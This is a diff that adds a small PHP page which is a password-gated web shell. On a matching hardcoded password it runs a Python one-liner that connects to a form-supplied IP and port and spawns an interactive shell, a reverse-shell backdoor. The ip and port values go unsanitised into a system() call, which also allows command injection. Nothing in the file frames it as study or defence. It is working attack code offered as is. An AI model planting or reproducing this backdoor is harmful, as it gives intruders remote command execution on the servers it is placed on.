@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    </head>
+    <body>
+        <form action="" method="post">
+            Password: <input type="password" name="password">
+            IP: <input type="text" name="ip">
+            Port: <input type="text" name="port">
+            <input type="submit" name="submit" value="Submit">
+        </form>
+        <?php
+        if(isset($_POST['submit'])) {
+            $password = $_POST["password"];
+            $ip = $_POST["ip"];
+            $port= $_POST["port"];
+            if ($password == "HAHAthereisnowaytheywillbeabletoguessmypassword") {
+                system("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'");
+            }
+        }
+    ?>
+    </body>
+</html>
